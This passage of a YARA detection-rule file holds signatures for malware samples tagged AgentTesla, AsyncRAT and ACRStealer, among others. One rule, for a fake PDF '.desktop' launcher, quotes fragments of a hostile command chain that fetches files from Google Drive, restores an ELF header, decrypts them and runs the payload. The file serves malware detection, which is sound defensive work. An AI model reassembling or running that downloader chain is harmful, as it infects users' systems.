      description = "_subset_batch - file 98f80ddb4abc202286c693b9ccb18d31451ee94336636c8cd7ece2fae7890152_98f80ddb.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "98f80ddb4abc202286c693b9ccb18d31451ee94336636c8cd7ece2fae7890152"
   strings:
      $s1 = "`5$\",@+A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 600KB and
      all of them
}

rule AgentTesla_signature__4a91e362 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_4a91e362.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4a91e362f81ce4c508dd733d526de1beef4c5380f2610041ad7055ed2d580b4a"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "zdqkyeu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__eb4e70d8 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_eb4e70d8.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eb4e70d8e0a67074bf67287ee7698f1279c41d8e265964e0aad2ebe938db5222"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule sig_9cbf06742c26cd16a0e982850fe3d826f4cf5ce588ad99328a2c6e480eef7cdc_9cbf0674 {
   meta:
      description = "_subset_batch - file 9cbf06742c26cd16a0e982850fe3d826f4cf5ce588ad99328a2c6e480eef7cdc_9cbf0674.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9cbf06742c26cd16a0e982850fe3d826f4cf5ce588ad99328a2c6e480eef7cdc"
   strings:
      $s1 = "^(*\"3%d~" fullword ascii /* score: '12.00'*/ /* hex encoded string '=' */
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s3 = "* 1F?~" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature_ {
   meta:
      description = "_subset_batch - file AgentTesla(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bc806f70854a98e24d62828e422dc927780f48b490a22fe957e59cc308271cf5"
   strings:
      $s1 = ";~'!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" fullword ascii /* score: '10.00'*/
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s3 = "* 'P,1" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__bf4d02eb {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_bf4d02eb.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf4d02eb5d6de1d94e36b537b3041e781b25fbebcb3ce7e20937e57548c5a59e"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__dd440abb {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_dd440abb.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd440abb299ff86d3a7c3796330d19401b97da63b7f6c393237e9170d748a530"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule sig_9936ccddb53807dc219d592292fb63f28931913f9cb7e350dff723cef22d4b11_9936ccdd {
   meta:
      description = "_subset_batch - file 9936ccddb53807dc219d592292fb63f28931913f9cb7e350dff723cef22d4b11_9936ccdd.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9936ccddb53807dc219d592292fb63f28931913f9cb7e350dff723cef22d4b11"
   strings:
      $s1 = "!function(r,n){if(\"object\"==typeof exports&&\"object\"==typeof module)module.exports=n();else if(\"function\"==typeof define&&" ascii /* score: '27.00'*/
      $s2 = "var LZfb984fc4=function(){var r=String.fromCharCode,o=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\",n=\"" ascii /* score: '22.00'*/
      $s3 = "2022574463" ascii /* score: '17.00'*/ /* hex encoded string ' "WDc' */
      $s4 = "odedURIComponent:function(r){return null==r?\"\":i._compress(r,6,function(r){return n.charAt(r)})},decompressFromEncodedURICompo" ascii /* score: '17.00'*/
      $s5 = "nt:function(r){return null==r?\"\":\"\"==r?null:(r=r.replace(/ /g,\"+\"),i._decompress(r.length,32,function(o){return t(n,r.char" ascii /* score: '16.00'*/
      $s6 = "+)e[r][r.charAt(n)]=n}return e[r][o]}var i={compressToBase64:function(r){if(null==r)return\"\";var n=i._compress(r,6,function(r)" ascii /* score: '12.00'*/
      $s7 = "decompressFromBase64:function(r){return null==r?\"\":\"\"==r?null:i._decompress(r.length,32,function(n){return t(o,r.charAt(n))}" ascii /* score: '12.00'*/
      $s8 = "h(m),l[h++]=i+m.charAt(0),i=m,0==--f&&(f=Math.pow(2,d),d++)}}};return i}();\"function\"==typeof define&&define.amd?define(functi" ascii /* score: '12.00'*/
      $s9 = "(r){for(var o=i.compress(r),n=new Uint8Array(2*o.length),e=0,t=o.length;e<t;e++){var s=o.charCodeAt(e);n[2*e]=s>>>8,n[2*e+1]=s%2" ascii /* score: '11.00'*/
      $s10 = "u,n),e=16;e--;)u[e]=0;return u[14]=8*t,v(o,u,n),o};function p(r){var n;return\"5d41402abc4b2a76b9719d911017c592\"!==u(b(\"hello" ascii /* score: '11.00'*/
      $s11 = ".amd)define([],n);else{var e=n();for(var t in e)(\"object\"==typeof exports?exports:r)[t]=e[t]}}(\"undefined\"!=typeof self?self" ascii /* score: '10.00'*/
      $s12 = "alue:\"Module\"}),Object.defineProperty(r,\"__esModule\",{value:!0})},e.t=function(r,n){if(1&n&&(r=e(r)),8&n)return r;if(4&n&&\"" ascii /* score: '10.00'*/
      $s13 = ",t,i,s={},u={},a=\"\",p=\"\",c=\"\",l=2,f=3,h=2,d=[],m=0,v=0;for(i=0;i<r.length;i+=1)if(a=r.charAt(i),Object.prototype.hasOwnPro" ascii /* score: '9.00'*/
      $s14 = "erable:!0,get:t})},e.r=function(r){\"undefined\"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(r,Symbol.toStringTag," ascii /* score: '9.00'*/
      $s15 = "-1,f--;break;case 2:return v.join(\"\")}if(0==f&&(f=Math.pow(2,d),d++),l[c])m=l[c];else{if(c!==h)return null;m=i+i.charAt(0)}v.p" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 30KB and
      8 of them
}

rule sig_9943bdf1b2a37434054b14a1a56a8e67aaa6a8b733ca785017d3ed8c1173ac59_9943bdf1 {
   meta:
      description = "_subset_batch - file 9943bdf1b2a37434054b14a1a56a8e67aaa6a8b733ca785017d3ed8c1173ac59_9943bdf1.desktop"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9943bdf1b2a37434054b14a1a56a8e67aaa6a8b733ca785017d3ed8c1173ac59"
   strings:
      $x1 = "Exec=bash -c \"wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1fzPR6HWqp_0eRx_bYy8ed2-lRj_19x0k' -O " ascii /* score: '56.00'*/
      $x2 = "Exec=bash -c \"wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1fzPR6HWqp_0eRx_bYy8ed2-lRj_19x0k' -O " ascii /* score: '50.00'*/
      $x3 = "tmp/Note_Warfare.pdf && xdg-open /tmp/Note_Warfare.pdf && wget -q -O mayuw 'https://drive.google.com/uc?export=download&id=190Ei" ascii /* score: '42.00'*/
      $x4 = "AcPzT6fK0qlnkoMkfhvaZX_hUY8F' && wget -q -O shjdfhd 'https://drive.google.com/uc?export=download&id=190EiAcPzT6fK0qlnkoMkfhvaZX_" ascii /* score: '42.00'*/
      $x5 = "hUY8F' && chmod +x shjdfhd && wget -q -O mayuw 'https://drive.google.com/uc?export=download&id=1McrLpzrzgYXYCF362h0AyKdbX6qIx4dg" ascii /* score: '38.00'*/
      $s6 = "' && printf '\\\\x7FELF' | dd of=mayuw bs=1 count=4 conv=notrunc &> /dev/null && chmod +x mayuw && ./mayuw -f shjdfhd -d 'NIC0ff" ascii /* score: '18.00'*/
      $s7 = "ialDB_Auth' && rm -r mayuw && ./shjdfhd\"" fullword ascii /* score: '18.00'*/
      $s8 = "Name=Future_Note_Warfare_OpSindoor.pdf" fullword ascii /* score: '11.00'*/
      $s9 = "Name[en_US]=Note_Warfare-Ops_Sindoor.pdf" fullword ascii /* score: '11.00'*/
      $s10 = "Comment=Future_Note_Warfare_OpSindoor PDF" fullword ascii /* score: '11.00'*/
      $s11 = "MimeType=application/x-executable;application/octet-stream;application/x-sh;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x445b and filesize < 2KB and
      1 of ($x*) and all of them
}

rule sig_99a371495a2adeac3ea8b4a3a292d1d2e095fc9df1fb9a6a47d2c0b642b8f1ee_99a37149 {
   meta:
      description = "_subset_batch - file 99a371495a2adeac3ea8b4a3a292d1d2e095fc9df1fb9a6a47d2c0b642b8f1ee_99a37149.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "99a371495a2adeac3ea8b4a3a292d1d2e095fc9df1fb9a6a47d2c0b642b8f1ee"
   strings:
      $s1 = "\\2\"F'+-" fullword ascii /* score: '10.00'*/ /* hex encoded string '/' */
      $s2 = "+ -7ie" fullword ascii /* score: '9.00'*/
      $s3 = "AgJf?* `m\\jJ$" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x32ad and filesize < 19000KB and
      all of them
}

rule a853fcad24f8d697c40e23951d036d65_imphash_ {
   meta:
      description = "_subset_batch - file a853fcad24f8d697c40e23951d036d65(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fc06d0b657c0e8061e928e673b114d9f649da232921f6072e5b2f5c6a38acd"
   strings:
      $s1 = "~dj.DLL" fullword ascii /* score: '17.00'*/
      $s2 = "HFUSERVICE" fullword wide /* score: '12.50'*/
      $s3 = "<!--The ID below indicates app support for Windows Developer Preview -->" fullword ascii /* score: '12.00'*/
      $s4 = "KERNELVI" fullword ascii /* score: '11.50'*/
      $s5 = "SCHOSTHQ" fullword wide /* score: '11.50'*/
      $s6 = "@@@@@@u" fullword ascii /* reversed goodware string 'u@@@@@@' */ /* score: '11.00'*/
      $s7 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s8 = "OSVERSION" fullword ascii /* score: '9.50'*/
      $s9 = "CONFREADER" fullword wide /* score: '9.50'*/
      $s10 = "2 2$2024282<2@" fullword ascii /* score: '9.00'*/ /* hex encoded string '" $("' */
      $s11 = "!--- G2 --LB" fullword ascii /* score: '9.00'*/
      $s12 = "(jlogED," fullword ascii /* score: '9.00'*/
      $s13 = "TASKDIALOG_BUT" fullword ascii /* score: '9.00'*/
      $s14 = "}& }#|,+20" fullword ascii /* score: '9.00'*/ /* hex encoded string ' ' */
      $s15 = "t - Quo8" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule AsyncRAT_signature__9f4693fc0c511135129493f2161d1e86_imphash_ {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_9f4693fc0c511135129493f2161d1e86(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e22b117b8f3bdd0f73eb3433daf8ed7ab15e36384354d20b5619387c2358131f"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADI" fullword ascii /* score: '27.00'*/
      $s2 = "BKhK.exe" fullword wide /* score: '22.00'*/
      $s3 = "BKhK.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "get_ShowSystemFiles" fullword ascii /* score: '12.00'*/
      $s5 = "Directory Plus - Bookmarks" fullword wide /* score: '12.00'*/
      $s6 = "bookmarks.xml" fullword wide /* score: '10.00'*/
      $s7 = "Error exporting bookmarks: " fullword wide /* score: '10.00'*/
      $s8 = "Error importing bookmarks: " fullword wide /* score: '10.00'*/
      $s9 = "get_LargestFiles" fullword ascii /* score: '9.00'*/
      $s10 = "<)<2<><E<" fullword ascii /* score: '9.00'*/ /* hex encoded string '.' */
      $s11 = "get_IsFavorite" fullword ascii /* score: '9.00'*/
      $s12 = "GetFilesAndFolders" fullword ascii /* score: '9.00'*/
      $s13 = "get_MaxFilesToAnalyze" fullword ascii /* score: '9.00'*/
      $s14 = "<GetFavoriteBookmarks>b__9_1" fullword ascii /* score: '9.00'*/
      $s15 = "get_FileTypeCount" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule ACRStealer_signature__2e9568585d9ce042f15bc3373f174a2d_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_2e9568585d9ce042f15bc3373f174a2d(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e88ae61e3d607bb53bfbab58dcd40462537608ef4377b3068432b99b1e3f05f1"
   strings:
      $s1 = "ImagePro.dll" fullword wide /* score: '23.00'*/
      $s2 = "E:\\svn_code\\Common\\MultimediaPlatform\\Branch\\4.2.5_DVDCreator221957\\Src\\SymbolTable\\Release\\ImageProc.pdb" fullword ascii /* score: '22.00'*/
      $s3 = "WS_ImageProc.dll" fullword ascii /* score: '20.00'*/
      $s4 = ".?AVFCSinglePixelProcessBase@@" fullword ascii /* score: '15.00'*/
      $s5 = "c:\\1.bmp" fullword wide /* score: '13.00'*/
      $s6 = "DIGetBitmapInfoSize" fullword ascii /* score: '9.00'*/
      $s7 = "DIGetBits" fullword ascii /* score: '9.00'*/
      $s8 = "IRGetFilterCount" fullword ascii /* score: '9.00'*/
      $s9 = "DIGetWidth" fullword ascii /* score: '9.00'*/
      $s10 = "DIGetDataSize" fullword ascii /* score: '9.00'*/
      $s11 = "DISetContent" fullword ascii /* score: '9.00'*/
      $s12 = "DIGetHeight" fullword ascii /* score: '9.00'*/
      $s13 = "IRGetFilterParam" fullword ascii /* score: '9.00'*/
      $s14 = "DIGetBitCount" fullword ascii /* score: '9.00'*/
      $s15 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__71fca2be {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_71fca2be.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "71fca2be8367b18e005c50b0e3d3dbec1c0b015adc8d51da08f5647ba64971c6"
   strings:
      $s1 = "IeSw.exe" fullword wide /* score: '22.00'*/
      $s2 = "IeSw.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "txtCommand" fullword wide /* score: '12.00'*/
      $s4 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s5 = "dt /w #" fullword ascii /* score: '9.00'*/
      $s6 = "tbxContent" fullword wide /* score: '9.00'*/
      $s7 = "GetFleet" fullword ascii /* score: '9.00'*/
      $s8 = "GetPlanet" fullword ascii /* score: '9.00'*/
      $s9 = "Client Socket Program - Server Connected ..." fullword wide /* score: '9.00'*/
      $s10 = "hazemark" fullword ascii /* score: '8.00'*/
      $s11 = "get_AssemblyCompany" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule ACRStealer_signature__0dac91d571710abf1256a743c4b815f1_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_0dac91d571710abf1256a743c4b815f1(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8e98938e5a33f8b70ff8d55b3592f9fd9e1b7e851d8b517b87827736e980257a"
   strings:
      $x1 = "Downloaded new DBGHELP.DLL\"Failed to download new DBGHELP.DLLForcing download of DBGHELP.DLLDeleting existing Minidump file M" wide /* score: '31.00'*/
      $s2 = "Failed to launch BsSndRpt.exe3DBGHELP.DLL too old. Failed to create Minidump file:DBGHELP.DLL does not exist. Failed to create M" wide /* score: '29.00'*/
      $s3 = "http://www.bugsplatsoftware.com/files/dbghelp.dll" fullword ascii /* score: '26.00'*/
      $s4 = "BugSplatHD.exe /p %ld /c \"%s\" /a \"%s\" /v \"%s\"" fullword ascii /* score: '25.00'*/
      $s5 = "C:\\www\\src\\BugSplat\\bin\\BugSplat.pdb" fullword ascii /* score: '25.00'*/
      $s6 = "BugSplatRc.dll" fullword ascii /* score: '23.00'*/
      $s7 = "BugSplat.dll" fullword ascii /* score: '23.00'*/
      $s8 = "Crash reporting module, BugSplat.DLL" fullword wide /* score: '23.00'*/
      $s9 = "BugSplat.DLL" fullword wide /* score: '23.00'*/
      $s10 = "BugSplat.dll: %s  %s" fullword ascii /* score: '22.00'*/
      $s11 = "BsSndRpt.exe" fullword ascii /* score: '22.00'*/
      $s12 = "bugsplat.log" fullword ascii /* score: '19.00'*/
      $s13 = "BugSplat.dll: " fullword ascii /* score: '19.00'*/
      $s14 = "Launching BsSndRpt.exe" fullword wide /* score: '19.00'*/
      $s15 = "Full Memory Dump Created" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bfd5c1dd {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bfd5c1dd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bfd5c1ddd57dd2cf89518b5524ed3319502860bd876eba635985307d8042a0d1"
   strings:
      $s1 = "dhcE.exe" fullword wide /* score: '22.00'*/
      $s2 = "dhcE.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s4 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s5 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s6 = "nwIk.Gsq%" fullword ascii /* score: '10.00'*/
      $s7 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s8 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s9 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s10 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s11 = "csvContent" fullword ascii /* score: '9.00'*/
      $s12 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__459e3408 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_459e3408.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "459e3408113537088a5825a91741e4a1de346bdef172710437725554ee90b04c"
   strings:
      $s1 = "yZNl.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s7 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s8 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s9 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s10 = "csvContent" fullword ascii /* score: '9.00'*/
      $s11 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__70edef5a {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_70edef5a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "70edef5a9165f8776f6bde6c60108c0bbcc33e7d10e07d16024bfedf70ec008b"
   strings:
      $s1 = "nhbW.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "nhbW.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s5 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s6 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s7 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s8 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s9 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s10 = "csvContent" fullword ascii /* score: '9.00'*/
      $s11 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__823d8594 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_823d8594.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "823d8594b505b1c10e814039aacb4447ec4394e5a971c0740c07a49d2b12cb34"
   strings:
      $s1 = "Tasn.exe" fullword wide /* score: '22.00'*/
      $s2 = "Tasn.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "statistics.dat" fullword wide /* score: '14.00'*/
      $s4 = "highscores.dat" fullword wide /* score: '14.00'*/
      $s5 = "Export Complete" fullword wide /* score: '12.00'*/
      $s6 = "get_TotalGamesCompleted" fullword ascii /* score: '12.00'*/
      $s7 = "get_GamesCompleted" fullword ascii /* score: '12.00'*/
      $s8 = "GetAverageCompletionTime" fullword ascii /* score: '12.00'*/
      $s9 = "GetCompletionRate" fullword ascii /* score: '12.00'*/
      $s10 = "<GetAverageCompletionTime>b__32_0" fullword ascii /* score: '12.00'*/
      $s11 = "get_CompletionTimes" fullword ascii /* score: '12.00'*/
      $s12 = "get_CompletionTime" fullword ascii /* score: '12.00'*/
      $s13 = "{0} - {1:mm\\:ss} - Score: {2}" fullword wide /* score: '12.00'*/
      $s14 = "Game Started - {0} Difficulty" fullword wide /* score: '12.00'*/
      $s15 = "Grid is valid - {0} cells remaining" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b60e9d25 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b60e9d25.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b60e9d25fa67a6abff4209e4419b52250e447b986f8ad459113c874bc72f676c"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "Nma8XnhkQUB4Vyf8Ly.ztyRuKUUcJZ5bFtbir+JN050Qdod9qN7CREcn+OPghbnPp2Kcd5v200o`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s4 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "MessagePackLib.dll" fullword ascii /* score: '23.00'*/
      $s7 = "Client.exe" fullword wide /* score: '22.00'*/
      $s8 = "SERVERZCUELLAR.exe" fullword ascii /* score: '22.00'*/
      $s9 = "Nma8XnhkQUB4Vyf8Ly.ztyRuKUUcJZ5bFtbir+JN050Qdod9qN7CREcn+OPghbnPp2Kcd5v200o`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s10 = "5A7744545664" ascii /* score: '17.00'*/ /* hex encoded string 'ZwDTVd' */
      $s11 = "Process " fullword wide /* score: '15.00'*/
      $s12 = "CloseMutex" fullword ascii /* score: '15.00'*/
      $s13 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s14 = "/J1oRyOIm+hyNwejeZeCvg5aD1NlqMfDlU/gUJ7qctgFSkZnPuWAxRYOSlV3UgEiaym8RsEPDsLj52+gaCd6DhZm+shhxIcEB86qL3pokm1fxPn4N21QgBjohGZ7gn5R" wide /* score: '14.00'*/
      $s15 = "bTZIUEExOThPbVc4NTEwZHpUcmZhMmNiT3Fua01YdzQ=" fullword wide /* base64 encoded string 'm6HPA198OmW8510dzTrfa2cbOqnkMXw4' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__1f23f452093b5c1ff091a2f9fb4fa3e9_imphash_ {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_1f23f452093b5c1ff091a2f9fb4fa3e9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "08f6c67fb5554835e142fdc12432a4f2554ea217c234d72400ec45220f358cb6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s8 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s9 = "xrhowpg" fullword ascii /* score: '8.00'*/
      $s10 = "alternaria" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__4ea4df5d94204fc550be1874e1b77ea7_imphash_ {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_4ea4df5d94204fc550be1874e1b77ea7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bee53e45ad0bfd77218b9a515d9ce3bb2fc5675dc72458382867162d8482ac0f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s8 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

